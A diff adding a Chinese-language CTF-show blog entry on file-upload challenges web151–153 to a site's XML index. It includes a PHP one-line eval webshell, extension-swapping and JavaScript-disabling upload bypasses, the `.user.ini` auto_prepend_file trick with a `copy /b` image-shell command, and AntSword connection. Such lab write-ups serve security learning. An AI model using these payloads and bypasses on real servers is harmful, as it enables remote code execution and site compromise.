@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>CTF-show-文件上传</title>
+      <link href="/2022/04/02/CTF-show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+      <url>/2022/04/02/CTF-show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1、web151"><a href="#1、web151" class="headerlink" title="1、web151"></a>1、web151</h3><p>（1）法一：抓包改后缀</p><p>题目提示是前台校验，发现能上传图片，于是准备好的一句话木马改为png后缀上传再抓包</p><p><code>&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;</code></p><p>将文件后缀修改为php再放包，可以看到文件上传成功</p><img src="https://gitee.com/mie1732/emc/raw/master/img/202204022036879.png" alt="修改为php后缀" style="zoom:80%;" /><img src="https://gitee.com/mie1732/emc/raw/master/img/202204021655028.png" alt="上传路径" style="zoom:80%;" /><p>上传成功后蚁剑连接即可得到flag</p><img src="https://gitee.com/mie1732/emc/raw/master/img/202204021659582.png" alt="蚁剑" style="zoom: 50%;" /><p>（2）法二：禁JS</p><p>搜索<code>about:config</code>修改<code>javascript.enabled</code>为false即可</p><p><img src="https://gitee.com/mie1732/emc/raw/master/img/202204021849881.png" alt="火狐"></p><p>但是禁用之后无法点击”上传图片”</p><h3 id="2、web152"><a href="#2、web152" class="headerlink" title="2、web152"></a>2、web152</h3><p>提示后端校验，于是上上传准备好的一句话木马（png）上传抓包，修改后缀即可</p><h3 id="3、web153"><a href="#3、web153" class="headerlink" title="3、web153"></a>3、web153</h3><p><code>.user.ini</code>配置文件</p><p>From：<a href="https://blog.csdn.net/lleo1/article/details/117263108">https://blog.csdn.net/lleo1/article/details/117263108</a></p><p>首先抓包改后缀无法实行，查看数据包，是Nginx于是考虑<code>.user.ini.</code>（<code>.htaccess</code>是Apache的）</p><img src="https://gitee.com/mie1732/emc/raw/master/img/202204021924523.png" alt="Nginx" style="zoom:80%;" /><p>先上传<code>.user.ini.png</code></p><img src="https://gitee.com/mie1732/emc/raw/master/img/202204022017815.png" alt="文件" style="zoom: 80%;" /><p>第一行为GIF的文件头</p><p><code>auto_prepend_file</code>：在加载第一个PHP代码之前先行加载该配置所指示的PHP文件</p><p><code>auto_append_file</code>：在每个PHP页面执行完成后所要执行的代码</p><p>抓包后删除png后缀</p><img src="https://gitee.com/mie1732/emc/raw/master/img/202204022036908.png" alt="删除png" style="zoom: 80%;" /><p>再上传1.png的图片马</p><p><code>copy 12.png /b + 1.php /a 1.png</code></p><p>上传后访问<code>/upload/index</code>若有回显则说明执行了php木马上传成功</p><img src="https://gitee.com/mie1732/emc/raw/master/img/202204022036050.png" alt="木马上传成功" style="zoom: 33%;" /><p>用蚁剑连接<code>/upload/index</code>即可得到flag</p><ul><li><code>.user.ini</code>配置文件详情：</li></ul><p>From：<a href="https://www.jianshu.com/p/c2ed6b05c964">https://www.jianshu.com/p/c2ed6b05c964</a></p><p>原理：</p><p>php.ini是php的核心配置文件，在php启动时被读取。<code>.user.ini</code>实际上是一个可由用户自定义的php.ini（除<code>PHP_INI_SYSTEM</code>外的模式都可以设置）</p><p><code>.user.ini</code>为一个动态加载的ini文件，修改后，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒）即可被重新加载</p><p>漏洞利用：</p><p>若网站不允许上传php文件，可以先上传<code>.user.ini</code>再上传一个图片马，再进行getshell，前提是<code>.user.ini</code>的文件下需要有正常的PHP文件</p><p>范围比<code>.htaccess</code>更广，<code>nginx/apache/IIS</code>只要是以fastcgi运行的php都可以用此方法</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF-show </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>文件上传（2）</title>
       <link href="/2022/03/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%882%EF%BC%89/"/>
       <url>/2022/03/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%882%EF%BC%89/</url>
